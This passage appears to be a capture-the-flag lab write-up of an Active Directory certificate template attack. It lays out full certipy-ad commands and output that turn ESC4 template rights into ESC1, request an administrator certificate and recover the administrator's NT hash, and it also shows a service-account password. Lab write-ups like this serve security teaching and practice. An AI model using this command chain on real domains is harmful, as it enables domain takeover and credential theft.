password = S3rv1cePower2024!
host = WIN-SRV01
autostart = true
```

# Enumeration as svc.services

I check bloodhound and see the user is a member off the `Certificate Services` group so i will enumerate using `certipy-ad`

```bash
$ certipy-ad find -u svc.services -p 'S3rv1cePower2024!' -dc-ip 10.1.128.126 -vulnerable -stdout

CA Name                             : 404finance-DC-404-CA
  
Certificate Templates
  0
    Template Name                       : Vuln-ESC4
    Display Name                        : Vuln-ESC4
    Enabled                             : True
    Client Authentication               : True

    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PendAllRequests
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          KDC Authentication

    Permissions
      Enrollment Permissions
        Enrollment Rights               : 404FINANCE.LOCAL\Service Account
      Object Control Permissions
        Owner                           : 404FINANCE.LOCAL\Enterprise Admins
        Full Control Principals         : 404FINANCE.LOCAL\Domain Admins
                                          404FINANCE.LOCAL\Local System
                                          404FINANCE.LOCAL\Enterprise Admins
        Write Owner Principals          : 404FINANCE.LOCAL\Service Account
                                          404FINANCE.LOCAL\Domain Admins
                                          404FINANCE.LOCAL\Local System
                                          404FINANCE.LOCAL\Enterprise Admins
        Write Dacl Principals           : 404FINANCE.LOCAL\Service Account
                                          404FINANCE.LOCAL\Domain Admins
                                          404FINANCE.LOCAL\Local System
                                          404FINANCE.LOCAL\Enterprise Admins
        Write Property Enroll           : 404FINANCE.LOCAL\Service Account
    [+] User Enrollable Principals      : 404FINANCE.LOCAL\Service Account
    [+] User ACL Principals             : 404FINANCE.LOCAL\Service Account
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

Here i have a ESC4 vulnerable template which essentially means the current users has dangerous rights over the certificate, such as setting it back to default. This would then mean its vulnerable to ESC1. Also the important information to take away form this output is the following.

- Enabled - True
- Client Authentication - True
- KDC Authentication is available
- Enrolment Rights, Service users. (The current user is a service account)

Next i will reset the template to the default configuration.

```bash
$ certipy-ad template -dc-ip 10.1.128.126 -u svc.services -p 'S3rv1cePower2024!' -template "Vuln-ESC4" -write-default-configuration
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'Vuln-ESC4.json'
[*] Wrote current configuration for 'Vuln-ESC4' to 'Vuln-ESC4.json'
[*] Updating certificate template 'Vuln-ESC4'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9cD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x00\x00\x14\x00\x94\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIOverlapPeriod: b'\x00\x80\xa6\n\xff\xde\xff\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     msPKI-RA-Signature: 0
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'Vuln-ESC4'? (y/N): y
[*] Successfully updated 'Vuln-ESC4
```

I then check the change

```bash
$ certipy-ad find -u svc.services -p 'S3rv1cePower2024!' -dc-ip 10.1.128.126 -vulnerable -stdout
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
```

I should now be able to request a `.pfx` as the administrator.

```bash
$ certipy-ad req -u 'svc.services' -p 'S3rv1cePower2024!' -upn "administrator" -dc-ip 10.1.128.126 -ca 404finance-DC-404-CA -template Vuln-ESC4  -key-size 2048
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

And then Auth with the admin.pfx to gain a NTLM hash.

Bingo!

```bash
$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.128.126 -domain 404finance.local 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@404finance.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@404finance.local': aad3b435b51404eeaad3b435b51404ee:a6019e48da8f602a60c30a6f0136d792
```

I can then remote in as the administrator and grab the `root.txt` flag from the administrators desktop.
